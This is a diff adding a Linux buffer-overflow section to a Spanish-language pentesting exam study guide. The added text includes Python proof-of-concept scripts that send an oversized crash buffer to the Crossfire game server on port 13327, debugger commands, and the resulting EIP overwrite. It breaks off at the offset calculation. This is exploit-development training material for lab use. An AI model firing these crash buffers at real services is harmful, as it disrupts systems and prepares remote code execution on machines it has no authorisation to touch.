@@ -16,6 +16,7 @@
      * [Mejorando el Exploit](#mejorando-el-exploit)
      * [Reduciendo el Size y Acceso por Powershell](#reduciendo-el-size-y-acceso-por-powershell)
 - [Buffer Overflow Linux (No cae en el examen)](#buffer-overflow-linux)
+     * [Calculando el Offset (Linux)](#calculando-el-offset)
 - [Pentesting](#pentesting)
      * [General](#general)
        * [Port Scanning](#port-scanning)
@@ -767,7 +768,84 @@ Hasta donde yo se, nunca ha caído un _Buffer Overflow_ de Linux, pero por si la
 
 #### Fuzzing
 
+Para esta primera parte, contamos con el siguiente POC:
 
+```python
+#!/usr/bin/python 
+
+import socket 
+
+host = "192.168.1.X" 
+
+crash = "\x41" * 4379 
+
+buffer = "\x11(setup sound " + crash + "\x90\x00#" 
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+
+print "[*]Sending evil buffer..." 
+s.connect((host,13327))
+s.send(buffer)
+data=s.recv(1024)
+print data 
+s.close()
+print "[*]Payload Sent!" 
+```
+
+El recurso lo podemos encontrar en el siguiente [enlace](https://github.com/pranatdayal/pentesting-scripts/blob/master/crossfire-poc.py). Adaptamos un poco el exploit a nuestras necesidades:
+
+```python
+#!/usr/bin/python 
+
+import socket, sys
+
+from struct import pack
+from time import sleep
+
+if len(sys.argv) != 2:
+	print "\nUso: python" + sys.argv[0] + " <direccionIP>\n"
+	sys.exit(0)
+
+host = sys.argv[1]
+port = 13327
+
+crash = "\x41" * 4379 
+
+buffer = "\x11(setup sound " + crash + "\x90\x00#" 
+
+try:
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+
+	print "[*] Enviando buffer..." 
+	s.connect((host,port))
+	s.send(buffer)
+	data=s.recv(1024)
+	print data 
+	s.close()
+	print "[*] Payload Enviado!" 
+except:
+	print "\nError conectando con el servicio...\n"
+	sys.exit(0)
+```
+
+Para este caso, nos dan un PoC con el offset calculado. Curiosamente, para este caso si superamos el tamaño del buffer el programa crasheará de otra forma, por lo que es importante mantener esta cifra fija y para cualquier operación que hagamos tener bien calculados los tamaños.
+
+Para empezar, iniciamos **edb** con el programa corriendo, de la siguiente forma:
+
+```bash
+$~ edb --run /usr/games/crossfire/bin/crossfire
+```
+
+Pulsamos la tecla **F9** 2 veces y mandamos el buffer desde consola. Desde **edb**, podremos observar la siguiente respuesta:
+
+```bash
+The debugged application encountered a segmentation fault.
+The address 0x41414141 does not appear to be mapped.
+```
+
+Lo cual está genial, pues estamos sobreescribiendo el registro EIP, tal y como podremos comprobar posteriormente desde la sección _Registers_ del aplicativo. Llegados a este punto, calculamos el Offset a continuación a fin de corroborar si efectivamente podemos tomar el control del **EIP**, mandando para ello 4 bytes correspondientes al caracter _B_ posteriormente.
+
+#### Calculando el Offset
 
 
 Pentesting
